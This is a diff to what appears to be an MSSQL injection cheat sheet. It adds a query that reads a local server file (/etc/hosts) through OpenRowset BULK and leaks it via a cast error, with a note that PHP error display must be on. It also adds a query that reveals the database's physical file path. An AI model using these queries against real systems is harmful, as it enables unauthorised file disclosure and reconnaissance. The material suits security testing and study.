@@ -90,6 +90,21 @@ Result
 
 ## Useful Queries
 
+### Read localfile through errors
+```
+Select cast((select x from OpenRowset(BULK '/etc/hosts',SINGLE_CLOB) R(x)) as int) 
+```
+* ```display_errors``` should be enabled on PHP configuration
+
+### Get database physical path
+```
+SELECT TOP 1 physical_name FROM sys.master_files
+```
+Response:
+```
+/var/opt/mssql/data/master.mdf
+```
+
 **CAUTION**
 The following query should be executed with caution as it has the potential to impact the performance of MSSQL, depending on the size of the table entries returned. It is recommended to run it only when there is confidence that the returned row isn't excessively long.
 
